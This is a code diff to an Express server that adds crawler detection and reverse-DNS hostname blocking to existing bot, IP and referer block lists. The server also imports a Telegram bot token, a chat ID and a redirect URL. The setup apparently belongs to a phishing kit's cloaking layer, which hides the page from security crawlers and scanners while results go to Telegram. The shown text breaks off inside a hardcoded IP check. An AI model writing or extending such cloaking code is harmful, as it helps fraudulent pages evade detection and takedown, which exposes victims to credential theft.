@@ -1,5 +1,6 @@
 const express = require('express');
 const app = express();
+const dns = require('dns');
 const bodyParser = require('body-parser');
 const path = require('path');
 const fs = require('fs').promises;
@@ -7,12 +8,15 @@ const axios = require('axios');
 const MobileDetect = require('mobile-detect');
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
+const UAParser = require('ua-parser-js');
+const { crawlerUserAgents } = require('crawler-user-agents');
 const { botToken, chatId, redirect_url } = require('./config/settings.js');
 const { botUAList } = require('./config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
 const { botRefList } = require('./config/botRef.js');
 const { sendMessageFor } = require('simple-telegram-message');
 const botBlock = require('./config/botBlocker.js'); // Import botBlock as an array
+const blockedHost = require('./path/to/blockedHost.js');
 const viewDir = path.join(__dirname, 'views');
 
 // Middleware for IP and bot detection
@@ -48,7 +52,12 @@ function isBotRef(referer) {
 }
 
 // Combined Bot detection middleware
-const UAParser = require('ua-parser-js');
+const isCrawler = (userAgent) => {
+    return crawlerUserAgents.some(crawler =>
+        new RegExp(crawler.pattern, 'i').test(userAgent)
+    );
+};
+
 
 const detectBotMiddleware = (req, res, next) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -64,6 +73,27 @@ const detectBotMiddleware = (req, res, next) => {
 
     console.log(`Detected IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
 
+    if (isCrawler(userAgent)) {
+        console.log(`Blocked crawler: User-Agent: ${userAgent}, IP: ${ip}`);
+        return res.status(403).send('Crawlers are not allowed');
+    }
+    
+    dns.reverse(ip, (err, hostnames) => {
+        if (err) {
+            console.error('Error resolving hostname:', err);
+            return next(); // Continue if hostname can't be resolved
+        }
+
+        // Check if any hostname contains blocked words
+        const isBlocked = hostnames.some(hostname =>
+            blockedHost.some(word => hostname.toLowerCase().includes(word))
+        );
+
+        if (isBlocked) {
+            console.log(`Blocked request from hostname: ${hostnames.join(', ')}`);
+            return res.status(404).send('Not found');
+        }
+    
     // Your blocking logic
     if (
         ip === "92.23.57.168" ||
